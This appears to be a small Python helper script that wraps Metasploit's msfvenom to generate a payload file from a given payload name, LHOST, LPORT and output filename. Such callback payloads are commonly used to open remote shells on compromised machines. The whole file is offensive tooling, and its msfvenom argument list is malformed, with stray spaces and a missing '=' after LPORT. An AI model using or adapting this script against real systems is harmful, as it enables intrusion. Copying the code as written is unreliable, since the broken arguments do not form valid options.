import subprocess

def generate(payload, LHOST, LPORT, fname): 

   print("------------------------------------------------------------------------------------------------------------")
   print("Generating Payload " + payload + " With LHOST " + LHOST + " With LPORT " +  LPORT)
   subprocess.call(["msfvenom", "-p", payload, " LHOST=", LHOST, " LPORT", LPORT, "-o", fname])
   print("------------------------------------------------------------------------------------------------------------")

